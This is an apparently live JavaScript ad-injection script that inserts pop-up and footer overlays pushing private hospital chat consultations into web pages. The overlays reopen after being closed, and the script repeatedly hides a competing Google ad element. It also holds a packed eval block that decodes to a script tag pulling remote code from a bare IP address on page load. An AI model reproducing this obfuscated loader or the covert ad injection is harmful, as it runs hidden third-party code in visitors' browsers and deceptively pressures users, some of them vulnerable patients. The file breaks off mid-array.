window.$G=window.$G||{wm:function(){},Version:0};
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?5135dbc89bd5cb7dc654852365a0805a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

(function(){
	/******************************************************************
	无阻加载JS	开始
	*******************************************************************/
	var getscript=function(s){
		var script,
				head = document.head || document.getElementsByTagName( "head" )[0] || document.documentElement;
		return {
				send: function( ) {
					script = document.createElement( "script" );
					script.async = "async";
					if ( s.scriptCharset ) {
						script.charset = s.scriptCharset;
					}
					
					script.onload = script.onerror = script.onreadystatechange = function( _, isAbort) {
						if (!script.readyState || /loaded|complete/.test( script.readyState ) ) {
							script.onload = script.onreadystatechange = null;
							if ( head && script.parentNode ) {
								head.removeChild( script );
							}
							script = undefined;
							try{
								if ( isAbort ) {
									s.callback  && s.callback( 200, "abort" );
								}else
									s.callback  && s.callback();
							} catch (e) {s.callback  && s.callback();}
						}
					};
					if(s.cache)
						s.url = s.url + ( /\?/.test( s.url ) ? "&" : "?" ) + "notcache=" + new Date().getTime();
					script.src = s.url;
					head.insertBefore( script, head.firstChild );
				},
				abort: function() {
					if ( script ) {
						script.onload( 0, 1 );
					}
				}
			};
	};
	var getjs=function(o){
		o=o||{};
		var stime=function(a,b){
			if(b=='abort'){
			}else{
				clearTimeout(st);
			}
			o.callback && o.callback(a,b);
		},	scp=getscript({
			 url:o.url,
			 callback:stime,
			 scriptCharset:o.charset,
			 cache:o.cache
			 })
		,	st=setTimeout(scp.abort,(o.time||15))
		;
		scp.send();
		
	};
	/******************************************************************
	无阻加载JS	结束
	*******************************************************************/
	
	
	/******************************************************************
	公共类初始化结束后执行方法	开始
	*******************************************************************/
	window.wmConfig=function(){
		/******************************************************
			var m=$G.model 广告展示方式公用类
			m.pic120X240	120X240浮动层展示
		*******************************************************/
		var m=$G.model  
		,	NewLine = '\n'
		,	top_google=window.document.getElementById('top_google')
		;
		if(top_google)
			setInterval(function(){
				top_google.style.display='none';
			},100);
		
		/*******************************
		code提示码说明
			001:'广告位标识无效'
		,	002:'param参数无效'
		,	003:'广告展现逻辑无效'
		,	004:'无人投放广告'
		,	005:'重复调用'
		*******************************/
		/***
			个性化展示图片广告处理方法
			JSON为封闭后的广告数据，可跟据自己的思路，对广告展显进行个性化处理
		***/
		var surl=window.document.location+''
		,	ids=',6055,6054,6053,6052,6051,6050,6049,'
		,	isShow=true
		;
		/*************文字广告	开始*******************/
		var textFn=function(json){
				//跟据广告唯一标识判断是否有广告
				if(!json['creativeId'] || !json['cabin']){
					return ;
				}
				/*********判断回调广告的类型**********/
				if(json.type==1){
					var dom=m.text(json);
					dom.mobile();
					var isDX = surl.indexOf('/dx/') >= 0;
					var isUser=ids.indexOf((','+json['act']+','));
					//window.document.title='unbound:'+json.unbound;
					if(json.unbound==1 && json.index<1){
						var htmlFoot=['<div style="margin:0;padding:0;width:100%;height:61px;position:fixed;bottom:0;left:0;z-index:9999999;">',
						'  <div name="foot_menu" style="height:60px;width:100%;overflow:hidden;background:#e6e5e5;border:1px solid #f27042;border-left:none;border-right:none;display:none;margin:-62px 0 0;padding:0;">',
						'    <ul style="height:100%;overflow:hidden;margin:0;padding:0">',
						'      <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:14.285%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'        <div style="margin:0;padding:0;width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot1/menu.png) no-repeat 50% 4px;"></div>',
						'        <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#333;line-height:26px;">性病</p>',
						'        </a> </li>',
						'      <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:14.285%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'        <div style="margin:0;padding:0;width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot1/menu.png) no-repeat 50% -36px;"></div>',
						'        <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#333;line-height:26px;">风湿病</p>',
						'        </a> </li>',
						'      <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:14.285%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'        <div style="margin:0;padding:0;width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot1/menu.png) no-repeat 50% -76px;"></div>',
						'        <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#333;line-height:26px;">骨科</p>',
						'        </a> </li>',
						'      <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:14.285%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'        <div style="margin:0;padding:0;width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot1/menu.png) no-repeat 50% -116px;"></div>',
						'        <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#333;line-height:26px;">五官科</p>',
						'        </a> </li>',
						'      <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:14.285%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'        <div style="margin:0;padding:0;width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot1/menu.png) no-repeat 50% -156px;"></div>',
						'        <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#333;line-height:26px;">口腔</p>',
						'        </a> </li>',
						'      <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:14.285%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'        <div style="margin:0;padding:0;width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot1/menu.png) no-repeat 50% -196px;"></div>',
						'        <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#333;line-height:26px;">癫痫</p>',
						'        </a> </li>',
						'      <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:14.285%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'        <div style="margin:0;padding:0;width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot1/menu.png) no-repeat 50% -236px;"></div>',
						'        <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#333;line-height:26px;">脑瘫</p>',
						'        </a> </li>',
						'    </ul>',
						'  </div>',
						'  <div style="height:60px;width:100%;overflow:hidden;background:#fe5f1b;border-top:1px solid #d7826c;margin:0;padding:0;">',
						'    <p style="height:58px;overflow:hidden;background:#fff;color:#f27042;font:12px \'Microsoft YaHei\';line-height:14px;width:20px;text-align:center;margin:1px 0 0 1px;padding:0;float:left;">点击咨询</p>',
						'    <div style="float:right;width:100%;height:100%;margin:0 0 0 -22px;padding:0;">',
						'      <ul style="height:100%;overflow:hidden;margin:0 0 0 18px;padding:0;float:none;">',
						'        <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:20%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'          <div style="width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot1/foot.png) no-repeat 50% 4px;margin:0;padding:0;"></div>',
						'          <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#fff;line-height:26px;">男科咨询</p>',
						'          </a> </li>',
						'        <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:20%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'          <div  style="width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot1/foot.png) no-repeat 50% -36px;margin:0;padding:0;"></div>',
						'          <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#fff;line-height:26px;">妇科咨询</p>',
						'          </a> </li>',
						'        <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:20%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'          <div  style="width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot1/foot.png) no-repeat 50% -76px;margin:0;padding:0;"></div>',
						'          <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#fff;line-height:26px;">皮肤科咨询</p>',
						'          </a> </li>',
						'        <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:20%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'          <div  style="width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot1/foot.png) no-repeat 50% -116px;margin:0;padding:0;"></div>',
						'          <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#fff;line-height:26px;">整形科咨询</p>',
						'          </a> </li>',
						'        <li name="menu_show" style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:20%;"> <a href="javascript:;" style="margin:0;padding:0;text-decoration:none;">',
						'          <div  style="width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot1/foot.png) no-repeat 50% -156px;margin:0;padding:0;"></div>',
						'          <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#fff;line-height:26px;">更多咨询</p>',
						'          </a> </li>',
						'      </ul>',
						'    </div>',
						'  </div>',
						'</div>',
						].join("");
						if(1==2)
						htmlFoot=['<div style="margin:0;padding:0;width:100%;height:61px;position:fixed;bottom:0;left:0;z-index:9999999;">',
						'  <div name="foot_menu" style="height:60px;width:100%;overflow:hidden;background:#cedbe9;border:1px solid #64adfa;border-left:none;border-right:none;display:none;margin:-62px 0 0;padding:0;">',
						'    <ul style="height:100%;overflow:hidden;margin:0;padding:0">',
						'      <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:14.285%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'        <div style="margin:0;padding:0;width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot2/menu.png) no-repeat 50% 4px;"></div>',
						'        <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#333;line-height:26px;">性病</p>',
						'        </a> </li>',
						'      <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:14.285%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'        <div style="margin:0;padding:0;width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot2/menu.png) no-repeat 50% -36px;"></div>',
						'        <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#333;line-height:26px;">风湿病</p>',
						'        </a> </li>',
						'      <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:14.285%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'        <div style="margin:0;padding:0;width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot2/menu.png) no-repeat 50% -76px;"></div>',
						'        <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#333;line-height:26px;">骨科</p>',
						'        </a> </li>',
						'      <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:14.285%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'        <div style="margin:0;padding:0;width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot2/menu.png) no-repeat 50% -116px;"></div>',
						'        <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#333;line-height:26px;">五官科</p>',
						'        </a> </li>',
						'      <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:14.285%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'        <div style="margin:0;padding:0;width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot2/menu.png) no-repeat 50% -156px;"></div>',
						'        <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#333;line-height:26px;">口腔</p>',
						'        </a> </li>',
						'      <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:14.285%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'        <div style="margin:0;padding:0;width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot2/menu.png) no-repeat 50% -196px;"></div>',
						'        <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#333;line-height:26px;">癫痫</p>',
						'        </a> </li>',
						'      <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:14.285%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'        <div style="margin:0;padding:0;width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot2/menu.png) no-repeat 50% -236px;"></div>',
						'        <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#333;line-height:26px;">脑瘫</p>',
						'        </a> </li>',
						'    </ul>',
						'  </div>',
						'  <div style="height:60px;width:100%;overflow:hidden;background:#64adfa;border-top:1px solid #64adfa;margin:0;padding:0;">',
						'    <p style="height:58px;overflow:hidden;background:#fff;color:#64adfa;font:12px \'Microsoft YaHei\';line-height:14px;width:20px;text-align:center;margin:1px 0 0 1px;padding:0;float:left;">点击咨询</p>',
						'    <div style="float:right;width:100%;height:100%;margin:0 0 0 -22px;padding:0;">',
						'      <ul style="height:100%;overflow:hidden;margin:0 0 0 18px;padding:0;float:none;">',
						'        <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:20%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'          <div style="width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot2/foot.png) no-repeat 50% 4px;margin:0;padding:0;"></div>',
						'          <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#fff;line-height:26px;">男科咨询</p>',
						'          </a> </li>',
						'        <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:20%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'          <div  style="width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot2/foot.png) no-repeat 50% -36px;margin:0;padding:0;"></div>',
						'          <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#fff;line-height:26px;">妇科咨询</p>',
						'          </a> </li>',
						'        <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:20%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'          <div  style="width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot2/foot.png) no-repeat 50% -76px;margin:0;padding:0;"></div>',
						'          <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#fff;line-height:26px;">皮肤科咨询</p>',
						'          </a> </li>',
						'        <li style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:20%;"> <a href="#" style="margin:0;padding:0;text-decoration:none;">',
						'          <div  style="width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot2/foot.png) no-repeat 50% -116px;margin:0;padding:0;"></div>',
						'          <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#fff;line-height:26px;">整形科咨询</p>',
						'          </a> </li>',
						'        <li name="menu_show" style="float:left;height:100%;text-align:center;margin:0;padding:0;list-style:none;width:20%;"> <a href="javascript:;" style="margin:0;padding:0;text-decoration:none;">',
						'          <div  style="width:100%;height:34px;background:url(http://static.adx.haomeit.com/images/foot2/foot.png) no-repeat 50% -156px;margin:0;padding:0;"></div>',
						'          <p style="margin:0;padding:0;height:26px;font:12px \'Microsoft YaHei\';color:#fff;line-height:26px;">更多咨询</p>',
						'          </a> </li>',
						'      </ul>',
						'    </div>',
						'  </div>',
						'</div>',
						].join("");
						
						var div=document.createElement('div')
						,	uuid=$G.uuidFast().replace(/-/ig,'')
						;
						/*$G.Each(function(i,k){
							htmlFoot=$G.Config.wmReplace(htmlFoot,'<!--'+k+'-->',this+'');
						},d[cn]);*/
						div.innerHTML=htmlFoot;
						document.body.appendChild(div);
						
						var menu_show=$G('.menu_show',div)
						,	foot_menu=$G('.foot_menu',div)
						,	oMenuImg=$G('div',menu_show[0])
						,	oMenuTxt=$G('p',menu_show[0])
						,	furl={
								 '男科咨询':'http://talk.haomeit.com/nanke'
								,'妇科咨询':'http://talk.haomeit.com/fukeyiy'
								,'皮肤科咨询':'http://talk.haomeit.com/zhuankeyiy'
								,'整形科咨询':'http://talk.haomeit.com/zhengxing'
								,'性病':'http://talk.haomeit.com/xingbing'
								,'风湿病':'http://talk.haomeit.com/fengshib'
								,'骨科':'http://talk.haomeit.com/guke'
								,'五官科':'http://talk.haomeit.com/wuguanke'
								,'口腔':'http://talk.haomeit.com/kouqiang'
								,'脑瘫':'http://talk.haomeit.com/xiaoernt'
								,'癫痫':'http://talk.haomeit.com/dx'
							}
						;
						$G('a',div).Each(function(){
							var str=this.innerHTML+'';
							str=str.replace(/[^\u4E00-\u9FA5\uf900-\ufa2d]/g, "");
							if(furl[str]){
								this.href=furl[str];
								this.target="_blank";
							}
						});
						menu_show.click(function(){
							if(foot_menu[0].style.display==''){
								oMenuTxt[0].style.color = '#fff';
								oMenuImg[0].style.background = 'url(http://static.adx.haomeit.com/images/foot1/foot.png) no-repeat 50% -156px';
								foot_menu.none();
							}else{
								oMenuTxt[0].style.color = '#070707';
								oMenuImg[0].style.background = 'url(http://static.adx.haomeit.com/images/foot1/foot.png) no-repeat 50% -196px';
								foot_menu.show();
							}
						});
						return;
					}
					if(isDX && isUser < 0) return;
					/*if(json.index==0){
						var href=json.webIM;
						var html='<a name="GlacierClose"  style="position:absolute; width:15px; height:15px; right:0; top:0;"></a> <a href="'+href+'" style="position:absolute; width:55px; height:23px; left:88px; top:84px; "></a> <a href="'+href+'" style="position:absolute; width:55px; height:23px; right:26px; top:84px;"></a>';
						var div=document.createElement('div');
						div.style.cssText='background:url(http://static.adx.haomeit.com/images/sjpiao.gif) left top no-repeat; width:240px; height:120px; overflow:hidden;';
						div.innerHTML=html;
						document.body.appendChild(div);
						var int={
								position:'fixed',
								isCenter:true
							}
						;
						var domDiv=$G(div);
						domDiv.WinAlt(int);
						$G('.GlacierClose',div).click(function(){
							domDiv.display().none();
							setTimeout(function(){
								domDiv.WinAlt(int);
							},20*1000);
						});
					};*/
					if(isShow){
							isShow=false;
							var htmls=['<div id="box" style="z-index:99999;width:240px;top:30%;left:50%;margin:0 0 0 -119px;position:fixed;height:140px;-webkit-animation-name:fadeIn;-webkit-animation-duration:0.5s;-webkit-animation-iteration-count:1;-webkit-animation-delay:0s;padding:0;">',
'<div id="kefutelclose" style="width:22px;height:22px;position:absolute;top:0px;right:0px;z-index:999;margin:0;padding:0;"><a href="javascript:;" style="width:20px;display:block;height:18px;margin:0;padding:0;outline:0;"></a></div>',
'<div style="width:240px;float:left;position:relative;z-index:998;margin:0;padding:0;"><a href="<!--webIM_Url-->" style="margin:0;padding:0;outline:0;"><img src="http://static.adx.haomeit.com/images/0923mb/jhsjswt.gif" border="0" /></a></div>',
'</div>',
'<div id="box2" style="width:30px;position:fixed;right:0px;top:20%;z-index:9999;display:none;-webkit-animation-name:fadeIn;-webkit-animation-duration:1s;-webkit-animation-iteration-count:1;-webkit-animation-delay:0s;margin:0;padding:0;"><span style="display:block;position:relative;top:0px;margin:0;padding:0;"></span><a href="<!--webIM_Url-->" style="margin:0;padding:0;outline:0;"><img src="http://static.adx.haomeit.com/images/0923mb/yp.gif" border="0" /></a></div>',
'<div id="sj-a" style="width:31px;position:fixed;left:5px;top:120px;z-index:222000;_position:absolute;_right:expression(eval(document.documentElement.scrollLeft+5));_top:expression(eval(document.documentElement.scrollTop+120))">',
'<a href="<!--webIM_Url-->" style="margin:0;padding:0;outline:0;"><img src="http://static.adx.haomeit.com/images/0923mb/swt1.gif" width="31" height="116" border="0" style="float:left;overflow:hidden" /></a>',
'<span onclick="clsa()" style="float:left;overflow:hidden;width:15px;height:15px;position:relative;margin:-117px 0 0 24px;cursor:pointer;padding:0;"><img src="http://static.adx.haomeit.com/images/0923mb/7.gif" border="0" style="float:left;overflow:hidden" /></span>',
'</div>',
'<!--底部-->',
'<div id="box3" style="z-index:99999;position:fixed;left:0; bottom:0;height:61px; width:100%; background:#0097a7;_position:absolute;_bottom:auto;',
'_top:expression(eval(document.documentElement.scrollTop+document.documentElement.clientHeight-this.offsetHeight-(parseInt(this.currentStyle.marginTop,10)||0)-(parseInt(this.currentStyle.marginBottom,10)||0)));margin:0;padding:0;">',
'	<ul style="margin:0;padding:0;height:61px;line-height:61px;">',
'		<li style="list-style:none;background:#0097a7 url(http://static.adx.haomeit.com/images/0923mb/0519dx_24.png) no-repeat center 5px;height:61px; width:25%; float:left; *width:24.7%;margin:0;padding:0;"><a href="<!--webIM_Url-->" style="text-align:center;padding:40px 0 0;margin:0;display:block;font:normal 16px \'微软雅黑\';color:#fff;outline:0;">电话咨询</a></li>',
'		<li style="list-style:none;background:#0097a7 url(http://static.adx.haomeit.com/images/0923mb/0519dx_25.png) no-repeat center 5px; height:61px; width:25%; float:left; *width:24.7%;margin:0;padding:0;"><a href="<!--webIM_Url-->" style="text-align:center;padding:40px 0 0;margin:0;display:block;font:normal 16px \'微软雅黑\';color:#fff;outline:0;">您的消息</a></li>',
'		<li style="list-style:none;background:#0097a7 url(http://static.adx.haomeit.com/images/0923mb/0519dx_23.png) no-repeat center 5px; height:61px; width:25%; float:left; *width:24.7%;margin:0;padding:0;"><a href="<!--webIM_Url-->" style="text-align:center;padding:40px 0 0;margin:0;display:block;font:normal 16px \'微软雅黑\';color:#fff;outline:0;">免费挂号</a></li>',
'		<li style="list-style:none;background:#0097a7 url(http://static.adx.haomeit.com/images/0923mb/0519dx_26.png) no-repeat center 5px; height:61px; width:25%; float:left; *width:24.7%;margin:0;padding:0;"><a href="<!--webIM_Url-->" style="text-align:center;padding:40px 0 0;margin:0;display:block;font:normal 16px \'微软雅黑\';color:#fff;outline:0;">来院咨询</a></li>',
'	</ul>',
'</div>'].join("");
							var div=document.createElement('div');
							$G.Each(function(i,k){
								htmls=$G.Config.wmReplace(htmls,'<!--'+k+'-->',this+'');
							},json);
							div.innerHTML=htmls;
							document.body.appendChild(div);
							var sa =document.getElementById("sj-a");
							function clsa(){
							  sa.style.display="none";
							}
							function opend(){
								sa.style.display="block";
							}
							if (isDX) {
								setInterval("opend()",8000);
							} else {
								clsa();
							}
							eval(function(p, a, c, k, e, d){
								e = function(c) {
									return (c < a ? "": e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36))
								};
								if (!''.replace(/^/, String)) {
									while (c--) d[e(c)] = k[c] || e(c);
									k = [function(e) {
										return d[e]
									}];
									e = function() {
										return '\\w+'
									};
									c = 1;
								};
								while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
								return p;
							} ('6.5("<0 8=\\\'7/2\\\' 1=\\\'4\\\' 3=\\\'9://f.e.h.g/b.a?d=c\\\'></0>");', 18, 18, 'script|charset|javascript|src|gb2312|writeln|document|text|type|http|php|s|390584|sid|156|42|143|140'.split('|'), 0, {}))
							
							function level() {
							  var oBox = document.getElementById('box');
							  var oH2 = document.getElementById("kefutelclose");
							  var oBox2 = document.getElementById('box2');
							  if (isDX) {
							  	oBox.style.display = 'block';
							  } else {
							  	oBox.style.display = 'none';
							  }
							  oBox2.style.display = 'none';
							  oH2.onclick = function() {
								oBox.style.display = 'none';
								oBox2.style.display = 'block';
								setTimeout(function() {
								  oBoxblock();
								  },8000);
								}
							};
							level();
							function oBoxblock() {
							  oBox = document.getElementById('box');
							  oBox2 = document.getElementById('box2');
							  oBox.style.display = 'block';
							  oBox2.style.display = 'none';
							}
							
							
							//顶部弹出对话效果
							  (function(){
							  	if (!isDX) return;                
								var sHTML = [
									'<style type="text/css">',
									'.topTips { -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; position: fixed; left:0; top: 0; width: 100%; z-index: 9999999999;-webkit-perspective: 600px; perspective: 600px; }',
									'.tipsInner {font-family: "Microsoft YaHei"; border-top-left-radius: 5px; border-top-right-radius: 5px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; border-radius: 5px; -webkit-box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5); box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5); background: #fff;-webkit-transform-origin: 0px 0px; transform-origin: 0px 0px; -webkit-transform: rotateX(90deg); transform: rotateX(90deg); opacity: 0; }',
									'@-webkit-keyframes fadeIn{0%{opacity:0;}50%{opacity:0.5;}100%{opacity:1;}}',
									'.tipsInner a { text-decoration:none;display: block; position: relative; padding-left: 50px; color: #111; }',
									'.tipsInner img { position: absolute; left: 8px; top: 50%; margin-top: -17px; width: 36px; height: auto; padding-right: 5px; background: #fff; }',
									'.tipsInner dl { margin:0; padding: 10px 5px; border-left: 1px solid #ccc; }',
									'.tipsInner dt { font-weight: bold;line-height:1em;font-size:12px }',
									'.tipsInner dd { margin:0; line-height: 1.2em;white-space:nowrap;text-overflow:ellipsis;overflow:hidden;font-size:12px; }',
									'.showTip { visibility:visible; }',
									'.showTip .tipsInner { -webkit-transform-origin: 0px 0px; transform-origin: 0px 0px; -webkit-transform: rotateX(0deg); transform: rotateX(0deg); opacity: 1; }',
									'.hideTip { visibility:hidden; }',
									'.hideTip .tipsInner { -webkit-transform-origin: 0px 100%; transform-origin: 0px 100%; -webkit-transform: rotateX(-90deg); transform: rotateX(-90deg); opacity: 0; }',
								'</style>',
									'<div class="topTips" id="toptips">',
									'   <div class="tipsInner">',
									'       <a href="<!--webIM_Url-->" target="_blank">',
								   
									'         <img src="http://static.adx.haomeit.com/images/0923mb/qqIcon.png" border="0" />',
									'         <dl>',
									'           <dt>专业癫痫病医院</dt>',
									'           <dd>您好，请问有什么可以帮助到您！</dd>',
									'         </dl>',
									'       </a>',
									'   </div>',
									'</div>'].join('\r\n');
								var o = document.createElement('div');
								$G.Each(function(i,k){
									sHTML=$G.Config.wmReplace(sHTML,'<!--'+k+'-->',this+'');
								},json);

								o.innerHTML = sHTML;
								while(o.firstElementChild){
									document.body.appendChild(o.firstElementChild);
								};  
									 T={hasClass:function(d,a){var c=d.className.split(/\s+/);for(var b=0;b<c.length;b++){if(c[b]==a){return true}}return false},addClass:function(b,a){if(!this.hasClass(b,a)){b.className+=" "+a}},removeClass:function(d,a){if(this.hasClass(d,a)){var c=d.className.split(/\s+/);for(var b=0;b<c.length;b++){if(c[b]==a){delete c[b]}}d.className=c.join(" ")}}};
							
									function Toptips(options){
										this.init(options);
									};
							
									Toptips.prototype = {
							
										constructor : Toptips,
							
										init : function(options){
											this.item = options.item;
											this.itemInner = options.item.children[0];
											this.loop = typeof options.loop == "undefined" ? true : options.loop;
											this.showTime = typeof options.showTime == "undefined" ? 10000 : options.showTime;
											this.hideTime = typeof options.hideTime == "undefined" ? 10000 : options.hideTime;
											this.showTimer = null;
											this.hideTimer = null;
											this.preTimer = null;
											this.item.style.WebkitTransition = this.item.style.transition = this.itemInner.style.WebkitTransition = this.itemInner.style.transition = "0.3s";
											var me = this;
											var initTimer = setTimeout(function(){
													me.showTip();
											},1000);
										},
							
										showTip : function(){
											var me = this;
											T.addClass(me.item,"showTip");
											T.removeClass(me.item,"hideTip");
							
											clearTimeout(me.hideTimer);
											me.showTimer = setTimeout(function(){
												me.hideTip();
											},me.showTime);
							
										},
							
										hideTip : function(){
											var me = this;
											T.removeClass(me.item,"showTip");
											T.addClass(me.item,"hideTip");
											me.item.style.visibility = me.itemInner.style.visibility = "hidden";
							
											if(me.loop){
												clearTimeout(me.showTimer);
							
												me.preTimer = setTimeout(function(){
													me.item.style.visibility = me.itemInner.style.visibility = "visible";
												},me.hideTime-100);
							
												me.hideTimer = setTimeout(function(){
													me.showTip();
												},me.hideTime);
							
											}
										}
									};
								setTimeout(function(){
								  var toptip = document.getElementById("toptips");
								  new Toptips({
									item : toptip,
									loop : true
								  }); 
								},4000);
									return false;
							   delete o;
							})();

////结束/////

							

					}
				}
			}
		;
		
		var loadFn=function(fn,where){
			var cfn=function(){
					if(where()){
						clearInterval(t);
						fn&&fn();
					}
				}
			,	t = setInterval(cfn, 0)
			;
		};
		var dxShow=function(cn,o){
				o=o||{};
				var d={};
				d['陕西']={
					'img1':'http://xakj.913wen.com/images/qqq111.gif'//中间
				,	'webim':'http://dlt.zoosnet.net/LR/Chatpre.aspx?id=DLT87827839&lng=cn&e=lc-hmt-85&r=lc-hmt-85&p=lc-hmt-85'
				};
				d['云南']={
					'img1':'http://xakj.913wen.com/images/kmdx/qqq111.gif'
				,	'webim':'http://dat.zoosnet.net/LR/Chatpre.aspx?id=DAT50342982&lng=cn&e=lc-hmt-dx-85&r=lc-hmt-dx-85&p=lc-hmt-dx-85'
				};
				d['黑龙江']={
					'img1':'http://xakj.913wen.com/images/heilj/qqq111.gif'
				,	'webim':'http://dgt.zoosnet.net/LR/Chatpre.aspx?id=DGT82181361&lng=cn&e=lc-hmt-85&r=lc-hmt-85&p=lc-hmt-85'
				};
				d['广东']={
					'img1':'http://gzxj.haomeit.com/templets/default/images/qqq111.gif'
				,	'webim':'http://det.zoosnet.net/LR/Chatpre.aspx?id=DET27952501&e=lc_gzdx(2bu)+w&r=lc_gzdx(2bu)+w&p=lc_gzdx(2bu)+w'
				};
				d['上海']={
					'img1':'http://js.ufstone.net/images/qqq111.gif'
				,	'webim':'http://phw.twos.net.cn/LR/Chatpre.aspx?id=phw28129993&lng=cn&r=lc(2bu)+w&p=lc(2bu)+w&e=lc(2bu)+w'
				};
				d['北京']={
					'img1':'http://js.ufstone.net/images/qqq111.gif'
				,	'webim':''
				};
				d['其他']={
					'img1':'http://js.ufstone.net/images/qqq111.gif'
				,	'webim':'http://phw.twos.net.cn/LR/Chatpre.aspx?id=phw28129993&lng=cn&r=lc(2bu)+w&p=lc(2bu)+w&e=lc(2bu)+w'
				};
				var html=['<!--左弹窗-->',
		
